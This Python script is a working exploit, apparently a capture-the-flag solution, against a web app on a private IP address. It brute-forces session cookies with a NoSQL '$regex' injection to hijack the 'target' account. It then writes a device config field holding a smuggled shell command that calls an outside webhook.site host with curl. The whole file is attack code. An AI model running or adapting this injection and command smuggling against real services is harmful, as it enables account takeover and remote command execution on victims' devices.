import requests
import json
import re

url = "http://10.90.17.194:3000"
device_id_regex = 'href="/device/([0-9a-f-]*)">'

# Taking over the target account
target_session = None
target_device = None
possible_tokens = ['']

alphabet = '0123456789abcdef'
while len(possible_tokens) > 0:
    #if target_device is not None:
    #    break
    current_token = possible_tokens.pop(0)

    if len(current_token) == 8:
        continue

    for x in alphabet:
        session_cookie = {'$regex': f'^{current_token + x}'}
        payload = 'j:' + json.dumps(session_cookie)

        r = requests.get(f'{url}/devices', cookies={'session': payload}, allow_redirects=False)

        if r.status_code == 200:
            if 'Username: target' in r.text:
                target_session = payload
                print(f'Found target session: {payload}')

                result = re.findall(device_id_regex, r.text)
                target_device = result[0]

                print(f'With device: {target_device}')

                break

            print(f'Found new possible token: {current_token + x}')
            possible_tokens.append(current_token + x)

if target_session is None:
    print('Failed to find target session')
    exit(1)

new_config = {
    "cpu_temperature" : "curl https://webhook.site/9d28b3e6-a58b-47b4-91aa-a28e35d15f52?canecanecane",
}

while True:
    r = requests.post(f'{url}/device/{target_device}/config', cookies={'session': target_session}, data=new_config)
    if r.status_code == 200:
        print('Successfully updated config')

print("Now you need to wait!")
